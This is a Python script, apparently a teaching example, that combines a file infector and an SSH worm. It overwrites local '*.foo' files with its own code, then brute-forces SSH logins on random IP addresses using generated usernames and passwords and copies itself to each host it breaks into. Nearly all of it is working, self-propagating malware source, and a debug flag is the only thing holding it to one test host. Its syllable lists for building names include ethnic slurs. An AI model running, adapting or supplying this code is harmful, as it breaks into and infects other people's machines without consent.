#!/usr/bin/env python
import sys
import os
import glob
import paramiko
import scp
import random

print("""\nHELLO FROM FooVirus\n\n""")

# change the foo files of current host
IN = open(sys.argv[0], 'r')
virus = [line for (i, line) in enumerate(IN)]

for item in glob.glob("*.foo"):
    IN = open(item, 'r')
    all_of_it = IN.readlines()
    IN.close()
    if any('foovirus' in line for line in all_of_it):
        continue
    os.chmod(item, 0o777)
    OUT = open(item, 'w')

    print('Affecting ' + item)
    OUT.writelines(virus)
    all_of_it = ['#' + line for line in all_of_it]
    OUT.writelines(all_of_it)
    OUT.close()


debug = 1

NHOSTS = NUSERNAMES = NPASSWDS = 3

##  The trigrams and digrams are used for syntheizing plausible looking
##  usernames and passwords.  See the subroutines at the end of this script
##  for how usernames and passwords are generated by the worm.
trigrams = '''bad bag bal bak bam ban bap bar bas bat bed beg ben bet beu bum 
            bus but buz cam cat ced cel cin cid cip cir con cod cos cop 
            cub cut cud cun dak dan doc dog dom dop dor dot dov dow fab 
            faq fat for fuk gab jab jad jam jap jad jas jew koo kee kil 
            kim kin kip kir kis kit kix laf lad laf lag led leg lem len 
            let nab nac nad nag nal nam nan nap nar nas nat oda ode odi 
            odo ogo oho ojo oko omo out paa pab pac pad paf pag paj pak 
            pal pam pap par pas pat pek pem pet qik rab rob rik rom sab 
            sad sag sak sam sap sas sat sit sid sic six tab tad tom tod 
            wad was wot xin zap zuk'''

digrams = '''al an ar as at ba bo cu da de do ed ea en er es et go gu ha hi 
            ho hu in is it le of on ou or ra re ti to te sa se si ve ur'''

trigrams = trigrams.split()
digrams = digrams.split()


def get_new_usernames(how_many):
    if debug:
        return ['root']      # need a working username for debugging
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    usernames = [
        ''.join(map(lambda x: random.sample(trigrams, 1)[0]
        if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3))) 
        for x in range(how_many)
    ]
    return usernames


def get_new_passwds(how_many):
    if debug:
        return ['mypassword']      # need a working username for debugging
    if how_many == 0:
        return 0
    selector = "{0:03b}".format(random.randint(0, 7))
    passwds = [
        ''.join(map(lambda x:  random.sample(trigrams, 1)[0] + (str(random.randint(0, 9))
        if random.random() > 0.5 else '') if int(selector[x]) == 1 else random.sample(digrams, 1)[0], range(3))) 
        for x in range(how_many)]
    return passwds


def get_fresh_ipaddresses(how_many):
    if debug:
        return ['172.17.0.2']
        # Provide one or more IP address that you
        # want `attacked' for debugging purposes.
        # The usrname and password you provided
        # in the previous two functions must
        # work on these hosts.
    if how_many == 0:
        return 0
    ipaddresses = []
    for i in range(how_many):
        first, second, third, fourth = map(lambda x: str(
            1 + random.randint(0, x)), [223, 223, 223, 223])
        ipaddresses.append(first + '.' + second + '.' + third + '.' + fourth)
    return ipaddresses


while True:
    usernames = get_new_usernames(NUSERNAMES)
    passwds = get_new_passwds(NPASSWDS)
#    print("usernames: %s" % str(usernames))
#    print("passwords: %s" % str(passwds))
    # First loop over passwords
    for passwd in passwds:
        # Then loop over user names
        for user in usernames:
            # And, finally, loop over randomly chosen IP addresses
            for ip_address in get_fresh_ipaddresses(NHOSTS):
                print("\nTrying password %s for user %s at IP address: %s" %
                    (passwd, user, ip_address))
                try:
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip_address, port=22, username=user,
                                password=passwd, timeout=5)
                    print("\n\nconnected\n")
                    # Let's make sure that the target host was not previously
                    # infected:
                    received_list = error = None
                    stdin, stdout, stderr = ssh.exec_command('ls')
                    error = stderr.readlines()
                    if error:
                        print(error)
                    received_list = list(
                        map(lambda x: x.encode('utf-8'), stdout.readlines()))
                    print("\n\noutput of 'ls' command: %s" %
                        str(received_list))
                    if str(received_list).find('FooWorm') >= 0:
                        print("\nThe target machine is already infected\n")
                        continue
                    print('Trying to exfiltrate')
                    scpcon = scp.SCPClient(ssh.get_transport())
                    # Now deposit a copy of FooWorm.py at the target host:
                    scpcon.put(sys.argv[0])
                    scpcon.close()
                except:
                    continue

    if debug:
        break
